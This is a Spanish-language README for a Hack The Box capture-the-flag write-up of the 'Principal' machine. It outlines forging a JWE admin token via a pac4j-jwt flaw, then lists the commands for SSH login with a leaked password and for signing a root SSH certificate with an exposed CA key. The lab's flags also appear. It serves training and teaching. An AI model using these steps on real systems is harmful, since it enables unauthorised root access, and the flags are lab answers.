# 🔐 Principal – Hack The Box (Medium)

[![HTB](https://img.shields.io/badge/HackTheBox-Principal-medium-yellow)](https://www.hackthebox.com/)
[![Python](https://img.shields.io/badge/Python-3.8%2B-blue)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)

> **Write-up completo de la máquina `Principal`** – Explotación de CVE-2026-29000 (pac4j-jwt JWE forgery) + escalada a root mediante certificados SSH.

## 📸 Vista rápida

| Fase | Técnica principal |
|------|-------------------|
| Enumeración | `nmap` → puerto 8080 abierto, servidor Jetty con `pac4j-jwt/6.0.3` |
| Bypass auth | Forja de token JWE con rol `ROLE_ADMIN` usando la clave pública JWKS |
| Acceso inicial | Credencial `D3pl0y_$$H_Now42!` → SSH como `svc-deploy` |
| Escalada de privilegios | Abuso de CA SSH: clave privada en `/opt/principal/ssh/ca` → firma de certificado para `root` |

## 🧠 ¿Qué problema resuelve este repositorio?

Demuestra habilidades en:
- Reconocimiento de servicios web y detección de versiones vulnerables.
- Manipulación de tokens JWT/JWE y explotación de `CVE-2026-29000`.
- Extracción de credenciales de endpoints de API protegidos.
- Uso de certificados SSH y mala configuración de una CA para escalar a root.

## 🛠️ Tecnologías utilizadas

- **Python 3** (con `jwcrypto`, `PyJWT`, `requests`)
- **OpenSSH** (certificados y firma de claves)
- **cURL, jq, nmap, gobuster**

## 📦 Instalación / Uso

```bash
# 1. Clona el repositorio
git clone https://github.com/tuusuario/principal-htb.git
cd principal-htb

# 2. Instala dependencias
pip install -r requirements.txt

# 3. Ejecuta el script de forja de token JWE
python3 forge_jwe.py --url http://principal.htb:8080

# 4. Una vez obtenida la contraseña, conéctate por SSH y escala a root
ssh svc-deploy@principal.htb
# Dentro de la máquina:
cd /opt/principal/ssh
ssh-keygen -t rsa -b 4096 -f /tmp/rootkey -N ""
ssh-keygen -s ca -I "exploit" -n root /tmp/rootkey.pub
ssh -i /tmp/rootkey root@localhost

🏆 Flags obtenidas
Flag	Valor
User	ae03f16d9cc263fb8e30ca26e7f3c03c
Root	d877755bf789aedddd17aec5865b3092
📸 Evidencia

https://assets/dashboard.png
Panel de administración accedido con el token JWE forjado.
📝 Lecciones aprendidas

    Nunca confiar en la configuración por defecto de librerías JWT/JWE sin validar algoritmos.

    Las claves privadas de CA no deben ser legibles por cuentas de servicio.

    La autenticación por certificado SSH es segura si la CA está bien protegida.

📄 Licencia

MIT – libre para uso educativo.
🤝 Contribuciones

Si encuentras mejoras, abre un issue o un pull request.
